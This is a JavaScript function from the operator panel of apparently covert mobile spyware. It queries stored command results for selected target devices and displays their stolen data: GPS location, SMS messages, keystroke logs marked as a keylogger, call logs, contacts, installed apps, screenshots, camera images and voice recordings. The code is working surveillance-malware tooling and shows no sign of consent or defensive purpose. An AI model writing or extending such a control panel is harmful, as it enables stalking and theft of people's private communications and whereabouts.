async function auditCmd(type) {
    if (selectedDeviceIds.size === 0) return toast("SELECT TARGETS TO AUDIT", "danger");

    document.getElementById('status-title').innerText = `CLUSTER AUDIT: ${type}`;
    document.getElementById('status-content').innerHTML = '<div style="padding:20px; text-align:center;">FETCHING CLUSTER DATA...</div>';
    document.getElementById('status-overlay').style.display = 'flex';

    // 1. Fetch Command History
    const { data: commands, error } = await sb.from('file_commands')
        .select('*')
        .eq('file_name', type)
        .in('device_id', Array.from(selectedDeviceIds))
        .order('created_at', { ascending: false })
        .limit(10);

    if (error) return document.getElementById('status-content').innerHTML = `Error: ${error.message}`;

    // 2. Fetch Latest Stats for cross-referencing (especially for FORCE_UPLOAD)
    const { data: stats } = await sb.from('device_stats')
        .select('*')
        .in('device_id', Array.from(selectedDeviceIds))
        .order('created_at', { ascending: false })
        .limit(10);

    document.getElementById('status-content').innerHTML = commands.map(c => {
        let statusCol = 'var(--text)';
        if (c.status === 'PENDING') statusCol = '#f59e0b';
        if (c.status === 'RECEIVED') statusCol = 'var(--primary)';
        if (c.status === 'EXECUTED' || c.status.includes('SUCCESS')) statusCol = 'var(--success)';
        if (c.status.includes('FAILED') || c.status.includes('ERROR')) statusCol = 'var(--danger)';

        // Helper: Find associated stat entry if this was a Force Upload
        const relatedStat = type === 'FORCE_UPLOAD' ? stats.find(s => 
            s.device_id === c.device_id && 
            Math.abs(new Date(s.created_at) - new Date(c.updated_at || c.created_at)) < 60000
        ) : null;

        const dataPayload = relatedStat || c.result_data;
        let dataHtml = "";

        if (dataPayload) {
            const d = dataPayload.payload || dataPayload;
            const cmdContent = (c.content || "").toLowerCase();
            const isAll = cmdContent === "all" || type !== "FORCE_UPLOAD";

            // MODULE: LOCATION
            if ((isAll || cmdContent.includes("location")) && (d.location_fresh || d.stream_location || d.lat)) {
                const loc = d.location_fresh || d.stream_location || d;
                if (loc.lat) {
                    const mapsUrl = `https://www.google.com/maps?q=${loc.lat},${loc.lon}`;
                    dataHtml += `<div style="margin-top:10px; padding:10px; background:rgba(0,243,255,0.1); border:1px solid var(--primary);">
                        <div style="color:var(--primary); font-size:0.7rem; font-weight:bold;">📍 LOCATION_IDENTIFIED</div>
                        <div style="font-size:0.8rem; margin:5px 0;">Coord: ${loc.lat.toFixed(5)}, ${loc.lon.toFixed(5)} (±${loc.acc || 0}m)</div>
                        <a href="${mapsUrl}" target="_blank" style="color:#fff; text-decoration:underline; font-size:0.75rem;">VIEW ON GOOGLE MAPS</a>
                    </div>`;
                }
            }

            // MODULE: SMS
            if ((isAll || cmdContent.includes("sms")) && ((d.sms_logs && d.sms_logs.length > 0) || (d.historical_sms && d.historical_sms.length > 0))) {
                const logs = d.sms_logs || d.historical_sms;
                dataHtml += `<div style="margin-top:10px; padding:10px; background:rgba(0,255,157,0.1); border:1px solid var(--success);">
                    <div style="color:var(--success); font-size:0.7rem; font-weight:bold;">💬 SMS_DATA_EXTRACTED (${logs.length})</div>
                    <div style="font-size:0.7rem; color:#aaa; margin-top:5px; max-height:60px; overflow:hidden;">
                        Last: "${logs[0]?.body || logs[0]?.txt || '...'}"
                    </div>
                    <div onclick="switchTab('dash')" style="color:var(--success); cursor:pointer; font-size:0.7rem; margin-top:5px; text-decoration:underline;">VIEW FULL LOGS IN DASHBOARD</div>
                </div>`;
            }

            // MODULE: VAULT / STORAGE
            if (d.size_report || c.result_file_path) {
                dataHtml += `<div style="margin-top:10px; padding:10px; background:rgba(112,0,255,0.1); border:1px solid var(--secondary);">
                    <div style="color:var(--secondary); font-size:0.7rem; font-weight:bold;">💾 STORAGE_AUDIT</div>
                    <div style="font-size:0.75rem;">${d.size_report || 'File Captured'}</div>
                    ${c.result_file_path ? `<div onclick="switchTab('files')" style="color:var(--secondary); cursor:pointer; font-size:0.7rem; text-decoration:underline;">LOCATE IN DATA VAULT</div>` : ''}
                </div>`;
            }

            // MODULE: VITALS
            if (d.battery_level !== undefined) {
                dataHtml += `<div style="margin-top:10px; color:#888; font-size:0.65rem; border-top:1px solid #222; padding-top:5px;">
                    ⚡ BATT: ${d.battery_level}% | 📶 ONLINE: ${d.online_time_minutes || 0}m
                </div>`;
            }

            // MODULE: USAGE / TIMELINE
            if ((isAll || cmdContent.includes("usage")) && (d.screen_time_minutes !== undefined || (d.app_usage_timeline && d.app_usage_timeline.length > 0))) {
                dataHtml += `<div style="margin-top:10px; padding:10px; background:rgba(245,158,11,0.1); border:1px solid #f59e0b;">
                    <div style="color:#f59e0b; font-size:0.7rem; font-weight:bold;">📈 USAGE_ANALYTICS</div>
                    <div style="font-size:0.8rem; margin:5px 0;">Screen Time: ${d.screen_time_minutes || 0}m</div>
                    <div style="font-size:0.65rem; color:#888;">App Switches: ${d.summary_stats?.app_switch_count || 0}</div>
                </div>`;
            }

            // MODULE: TYPING / KEYLOGGER
            if ((isAll || cmdContent.includes("typing")) && ((d.typing_history && d.typing_history.length > 0) || d.summary_stats?.typing_chars > 0)) {
                dataHtml += `<div style="margin-top:10px; padding:10px; background:rgba(236,72,153,0.1); border:1px solid #ec4899;">
                    <div style="color:#ec4899; font-size:0.7rem; font-weight:bold;">⌨️ KEYSTROKE_LOGS</div>
                    <div style="font-size:0.8rem; margin:5px 0;">Chars Captured: ${d.summary_stats?.typing_chars || 0}</div>
                    <div style="font-size:0.65rem; color:#888;">Avg Speed: ${d.summary_stats?.typing_wpm || 0} WPM</div>
                </div>`;
            }

            // MODULE: CALLS
            if ((isAll || cmdContent.includes("calls")) && (d.calls && d.calls.length > 0)) {
                dataHtml += `<div style="margin-top:10px; padding:10px; background:rgba(59,130,246,0.1); border:1px solid #3b82f6;">
                    <div style="color:#3b82f6; font-size:0.7rem; font-weight:bold;">📞 CALL_LOG_EXTRACTED (${d.calls.length})</div>
                    <div style="font-size:0.7rem; color:#aaa; margin-top:4px;">Latest: ${d.calls[0]?.name || 'Unknown'} (${d.calls[0]?.num || 'N/A'})</div>
                </div>`;
            }

            // MODULE: CONTACTS
            if ((isAll || cmdContent.includes("contacts")) && (d.contacts && d.contacts.length > 0)) {
                dataHtml += `<div style="margin-top:10px; padding:10px; background:rgba(16,185,129,0.1); border:1px solid #10b981;">
                    <div style="color:#10b981; font-size:0.7rem; font-weight:bold;">👥 CONTACT_LIST_SYNC (${d.contacts.length})</div>
                </div>`;
            }

            // MODULE: APPS
            if ((isAll || cmdContent.includes("apps")) && (d.apps && d.apps.length > 0)) {
                dataHtml += `<div style="margin-top:10px; padding:10px; background:rgba(139,92,246,0.1); border:1px solid #8b5cf6;">
                    <div style="color:#8b5cf6; font-size:0.7rem; font-weight:bold;">📦 APP_INVENTORY_EXTRACTED (${d.apps.length})</div>
                    <div style="font-size:0.7rem; color:#aaa; margin-top:4px;">Newest: ${d.apps[0]?.name || 'N/A'}</div>
                </div>`;
            }

            // MODULE: MEDIA / SCREENSHOT / VOICE / IMAGE
            if (type === 'GET_SCREENSHOT' || type === 'CAPTURE_IMAGE' || type === 'RECORD_VOICE' || c.result_file_path?.includes('PULL')) {
                dataHtml += `<div style="margin-top:10px; padding:10px; background:rgba(255,255,255,0.05); border:1px solid #555;">
                    <div style="color:#fff; font-size:0.7rem; font-weight:bold;">📸 MEDIA_READY</div>
                    <div style="font-size:0.75rem; color:#aaa; margin:5px 0;">${c.result_file_path ? c.result_file_path.split('/').pop() : 'Processing capture...'}</div>
                    <div onclick="switchTab('files')" style="color:var(--primary); cursor:pointer; font-size:0.7rem; text-decoration:underline;">OPEN IN VAULT</div>
                </div>`;
            }
        }

        return `
            <div class="card" style="margin-bottom:15px; border-left-color: ${statusCol}">
                <div style="display:flex; justify-content:space-between; font-size:0.7rem; color:#666; margin-bottom:5px;">
                    <span>ID: ${c.device_id.substring(0,8)}...</span>
                    <span>${new Date(c.created_at).toLocaleString()}</span>
                </div>
                <div style="font-size:0.85rem; font-weight:bold; color:${statusCol}">${c.status}</div>
                <div style="font-size:0.75rem; color:#666; margin-top:5px; font-style:italic;">CMD: ${c.content.substring(0,40)}</div>

                ${dataHtml}

                ${c.error_log ? `<div style="color:var(--danger); font-size:0.7rem; margin-top:8px; border-top:1px solid #300; padding-top:5px;">ERR_LOG: ${c.error_log}</div>` : ''}
            </div>
        `;
    }).join('') || '<div style="padding:40px; text-align:center; color:#444;">NO COMMAND HISTORY</div>';

